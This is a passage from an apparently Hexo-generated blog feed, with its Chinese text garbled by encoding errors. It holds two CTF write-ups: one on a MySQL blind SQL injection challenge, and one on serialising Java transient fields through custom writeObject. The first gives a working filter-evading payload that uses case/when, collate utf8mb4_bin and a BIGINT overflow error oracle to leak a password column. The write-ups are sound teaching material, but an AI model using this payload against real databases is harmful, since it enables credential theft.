</p><ul><li>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†åŒæ‹¬å·ï¼Œç©ºæ ¼(\s),æ³¨é‡Šç¬¦å·(/**/,#)</li><li>è¿‡æ»¤äº†union å°±ä¸èƒ½è¿›è¡Œè”åˆæŸ¥è¯¢</li><li>æ ¹æ®æç¤ºutf8mb4_binæ˜¯è¦è¿›è¡Œå¤§å°å†™åŒºåˆ†çš„</li></ul><h2 id="3-è¯­å¥åˆ†æ"><a href="#3-è¯­å¥åˆ†æ" class="headerlink" title="3.è¯­å¥åˆ†æ"></a>3.è¯­å¥åˆ†æ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;||case&#x27;1&#x27;when`password`collate&#x27;utf8mb4_bin&#x27;like&#x27;&#123;&#125;%&#x27;then+9223372036854775807+1+&#x27;&#x27;else&#x27;0&#x27;end||&#x27;</span><br></pre></td></tr></table></figure><ul><li><h4 id="case"><a href="#case" class="headerlink" title="case"></a>case</h4><p>å¦‚æœæŒ‰æ­£å¸¸çš„è¯­å¥ï¼Œä¸€èˆ¬æ˜¯ç”¨if(condition,1,0)è¿›è¡Œåˆ¤æ–­ï¼Œä½†æ˜¯è¿™é‡Œè¿‡æ»¤äº†()ï¼Œé‚£ä¹ˆå°±ä¸èƒ½æ­£å¸¸ä½¿ç”¨äº†ï¼ŒåŒç†ä¹Ÿä¸èƒ½ç”¨æ—¶é—´ç›²æ³¨å»è¿›è¡Œåˆ¤æ–­äº†ï¼Œå› ä¸ºä½¿ç”¨å‡½æ•°éƒ½éœ€è¦ç”¨æ‹¬å·ã€‚<br>é‚£ä¹ˆè¿™é‡Œä½¿ç”¨çš„æ˜¯</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">case case_value</span><br><span class="line">    when condition then statement</span><br><span class="line">    when condition then statement</span><br><span class="line">    else statement</span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li><h4 id="utf8mb4-bin"><a href="#utf8mb4-bin" class="headerlink" title="utf8mb4_bin"></a>utf8mb4_bin</h4><p>ä¸»è¦ç”¨äºç¼–ç ï¼Œè®©mysqlå¯ä»¥æ”¯æŒ4ä½çš„utf8ç¼–ç ï¼Œè®©å­—ç¬¦å˜ä¸ºäºŒè¿›åˆ¶ï¼Œç„¶åå¼€å§‹å¯¹æ¯”ã€‚<br>ä¸€èˆ¬é…åˆcollateè¿›è¡Œä½¿ç”¨ï¼Œä¾‹å¦‚<br><code>select * from users where username collate utf8mb4_bin=&#39;admin&#39;</code><br>å°±ä¼šå°†åˆ—åusernameä¸‹çš„å€¼å’Œå­—ç¬¦adminè½¬ä¸ºutf8mb4_binè¿›è¡Œå¯¹æ¯”</p></li><li><h4 id="æœ€åçš„é‡ç‚¹å°±æ˜¯-9223372036854775807"><a href="#æœ€åçš„é‡ç‚¹å°±æ˜¯-9223372036854775807" class="headerlink" title="æœ€åçš„é‡ç‚¹å°±æ˜¯ 9223372036854775807"></a>æœ€åçš„é‡ç‚¹å°±æ˜¯ 9223372036854775807</h4>  åœ¨mysqlä¸­ï¼Œé»˜è®¤æ•°å­—ä¼šè§†ä¸º<code>BIGINT</code>ç±»å‹ï¼Œä¹Ÿå°±æ˜¯-9223372036854775808-9223372036854775807<br>  å¦‚æœ9223372036854775807+1å°±ä¼šæº¢å‡ºï¼Œç„¶åæŠ¥é”™ã€‚<br>  ä½†æ˜¯å¦‚æœæ˜¯9223372036854775808ï¼Œä»–ä¼šé»˜è®¤æŠŠè¿™ä¸ªæ•°å­—è½¬æ¢æˆ<code>unsigned bigint</code>ç±»å‹<br>  å¦‚ä¸‹å›¾<br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/1.jpg" alt><br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/2.jpg" alt><br>  é‚£ä¹ˆå¦‚æœç›´æ¥è®¾ç½®9223372036854775808ï¼Œä»–æ˜¯ä¸ä¼šæŠ¥é”™çš„ï¼Œå› ä¸ºä¼šæŠŠä»–è½¬åŒ–ä¸º<code>unsigned bigint</code>ç±»å‹<br>  æ‰€ä»¥éœ€è¦9223372036854775807+1ï¼Œè¿™æ ·å°±è¶…è¿‡bigintç±»å‹çš„æœ€å¤§èŒƒå›´<br>  å½“ç„¶ä¹Ÿå¯ä»¥è¶…è¿‡<code>unsigned bigint</code>ï¼Œæ¯”å¦‚18446744073709551615+1ï¼Œå½“ç„¶è¿˜æœ‰å¾ˆå¤šå…¶å®ƒç±»å‹doubleç±»å‹ä¹‹ç±»çš„ï¼Œéƒ½å¯ä»¥å»æº¢å‡ºï¼ŒåŸç†ç›¸åŒï¼Œè¿™ç§æ–¹æ³•ä¸ä¼šåœ¨è¯­å¥ä¸­å‡ºç°æ‹¬å·</li></ul><h2 id="4-å‚è€ƒé“¾æ¥"><a href="#4-å‚è€ƒé“¾æ¥" class="headerlink" title="4.å‚è€ƒé“¾æ¥"></a>4.å‚è€ƒé“¾æ¥</h2><ul><li>case:<a href="https://dev.mysql.com/doc/refman/8.0/en/case.html">https://dev.mysql.com/doc/refman/8.0/en/case.html</a></li><li>utf8mb4_bin:<a href="https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html">https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html</a></li><li>collate:<a href="https://www.jb51.net/article/214738.htm">https://www.jb51.net/article/214738.htm</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-å‰è¨€&quot;&gt;&lt;a href=&quot;#1-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;1.å‰è¨€&quot;&gt;&lt;/a&gt;1.å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ€è¿‘åœ¨ç–¯ç‹‚æ¶è¡¥sqlæ³¨å…¥çš„çŸ¥è¯†ï¼Œäº†è§£åˆ°å›½èµ›åˆèµ›æœ‰ä¸€é“sqlæ³¨å…¥çš„é¢˜ç›®ï¼Œå°±å»çœ‹äº†ä¸€ä¸‹&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="sqlæ³¨å…¥" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>java transientååºåˆ—åŒ–</title>
    <link href="http://example.com/2022/08/02/java-transient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2022/08/02/java-transient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-08-02T08:51:04.000Z</published>
    <updated>2022-12-01T15:37:57.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-å‰è¨€"><a href="#1-å‰è¨€" class="headerlink" title="1.å‰è¨€"></a>1.å‰è¨€</h2><p>é‡åˆ°ctfé¢˜ç›®é‡Œé¢éœ€è¦ååºåˆ—åŒ–transientå…³é”®å­—çš„å˜é‡<br>ä½†æ˜¯transientå…³é”®å­—ä¿®é¥°çš„å˜é‡æ˜¯ä¸è¿›å…¥ååºåˆ—çš„<br><span id="more"></span><br>ä¸‹é¢æ˜¯éƒ¨åˆ†ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testC</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String height;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testC</span><span class="params">(String name, String age, String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHeight</span><span class="params">(String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="built_in">this</span>.height = (String)s.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> testC) &#123;</span><br><span class="line">            <span class="type">testC</span> <span class="variable">user</span> <span class="operator">=</span> (testC)obj;</span><br><span class="line">            <span class="keyword">return</span> user.getAge().equals(<span class="built_in">this</span>.age) &amp;&amp; user.getHeight().equals(<span class="built_in">this</span>.height) &amp;&amp; user.getName().equals(<span class="built_in">this</span>.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, height=&#x27;&quot;</span> + <span class="built_in">this</span>.height + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="2-transientå…³é”®å­—çš„ä½œç”¨"><a href="#2-transientå…³é”®å­—çš„ä½œç”¨" class="headerlink" title="2.transientå…³é”®å­—çš„ä½œç”¨"></a>2.transientå…³é”®å­—çš„ä½œç”¨</h2><p>åœ¨javaä¸­ï¼Œtransientä¸»è¦ç”¨æ¥é˜²æ­¢æˆå‘˜å˜é‡è¢«ååºåˆ—åŒ–ã€‚<br>ä½¿ç”¨è¯­æ³•å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@transient</span></span><br><span class="line"><span class="keyword">private</span> String var1;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String var2;</span><br></pre></td></tr></table></figure><br><code>@transient</code>ç”¨äºhibernate entity classä¸­ï¼Œä½¿ç”¨åå°±ä¼šå¿½ç•¥æ‰è¿™ä¸ªå­—æ®µä¸ä¼šè®©è¿™äº›å˜é‡å†™å…¥æ•°æ®åº“ä¸­</p><h2 id="3-è®©transientå˜é‡è¿›å…¥ååºåˆ—åŒ–"><a href="#3-è®©transientå˜é‡è¿›å…¥ååºåˆ—åŒ–" class="headerlink" title="3.è®©transientå˜é‡è¿›å…¥ååºåˆ—åŒ–"></a>3.è®©transientå˜é‡è¿›å…¥ååºåˆ—åŒ–</h2><p>ç”¨ä¸‹é¢çš„ä»£ç æ¥è§£é‡Šä¸€ä¸‹readObjectå’ŒwriteObjectæ–¹æ³•<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String firstName;</span><br><span class="line">  <span class="keyword">private</span> String lastName;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> accountNumber;</span><br><span class="line">  <span class="keyword">private</span> Date dateOpened;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String firstName, String lastName, <span class="type">int</span> accountNumber, Date dateOpened)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.firstName = firstName;</span><br><span class="line">    <span class="built_in">this</span>.lastName = lastName;</span><br><span class="line">    <span class="built_in">this</span>.accountNumber = accountNumber;</span><br><span class="line">    <span class="built_in">this</span>.dateOpened = dateOpened;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//Setters and Getters</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream aInputStream)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span><br><span class="line">  &#123;   </span><br><span class="line">    firstName = aInputStream.readUTF();</span><br><span class="line">    lastName = aInputStream.readUTF();</span><br><span class="line">    accountNumber = aInputStream.readInt();</span><br><span class="line">    dateOpened = <span class="keyword">new</span> <span class="title class_">Date</span>(aInputStream.readLong());</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream aOutputStream)</span> <span class="keyword">throws</span> IOException </span><br><span class="line">  &#123;</span><br><span class="line">    aOutputStream.writeUTF(firstName);</span><br><span class="line">    aOutputStream.writeUTF(lastName);</span><br><span class="line">    aOutputStream.writeInt(accountNumber);</span><br><span class="line">    aOutputStream.writeLong(dateOpened.getTime());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>writeXXXç”±ObjectOutputStreamæä¾›ï¼ŒreadXXXåŒç†<br>è¯»å–å’Œå†™å…¥çš„é¡ºåºå¿…é¡»æ˜¯ä¸€æ ·çš„<br>åºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨writeXXXæŠŠå…¶ä¸­çš„å­—æ®µå†™å…¥<br>ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè°ƒç”¨readXXXï¼ŒæŒ‰å†™å…¥é¡ºåºè¯»å–ï¼ˆç±»å‹è¦ç›¸åŒï¼‰<br>writeUTFæ˜¯å†™å…¥å­—ç¬¦ä¸²ï¼ŒIntæ˜¯æ•´æ•°ï¼Œç­‰ç­‰<br>writeObjectå¯ä»¥å†™å…¥ä»»æ„çš„ç±»å‹<br><br></p><p>é‚£ä¹ˆåœ¨çœ‹å›æœ€å¼€å§‹çš„é¢˜ç›®ï¼Œæ˜¾è€Œæ˜“è§ï¼Œåªéœ€è¦åœ¨testCä¸­è¿™ä¸ªç±»åŠ å…¥writeObjectï¼Œåœ¨è¿›è¡Œåºåˆ—åŒ–å°±å¯ä»¥äº†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testC</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String height;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testC</span><span class="params">(String name, String age, String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHeight</span><span class="params">(String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="built_in">this</span>.height = (String)s.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> testC) &#123;</span><br><span class="line">            <span class="type">testC</span> <span class="variable">user</span> <span class="operator">=</span> (testC)obj;</span><br><span class="line">            <span class="keyword">return</span> user.getAge().equals(<span class="built_in">this</span>.age) &amp;&amp; user.getHeight().equals(<span class="built_in">this</span>.height) &amp;&amp; user.getName().equals(<span class="built_in">this</span>.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject(<span class="built_in">this</span>.height);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, height=&#x27;&quot;</span> + <span class="built_in">this</span>.height + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/08/02/java-transient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.delftstack.com/howto/java/transient-in-java/">https://www.delftstack.com/howto/java/transient-in-java/</a></p><p><a href="https://howtodoinjava.com/java/serialization/custom-serialization-readobject-writeobject/">https://howtodoinjava.com/java/serialization/custom-serialization-readobject-writeobject/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-å‰è¨€&quot;&gt;&lt;a href=&quot;#1-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;1.å‰è¨€&quot;&gt;&lt;/a&gt;1.å‰è¨€&lt;/h2&gt;&lt;p&gt;é‡åˆ°ctfé¢˜ç›®é‡Œé¢éœ€è¦ååºåˆ—åŒ–transientå…³é”®å­—çš„å˜é‡&lt;br&gt;ä½†æ˜¯transientå…³é”®å­—ä¿®é¥°çš„å˜é‡æ˜¯ä¸è¿›å…¥ååºåˆ—çš„&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
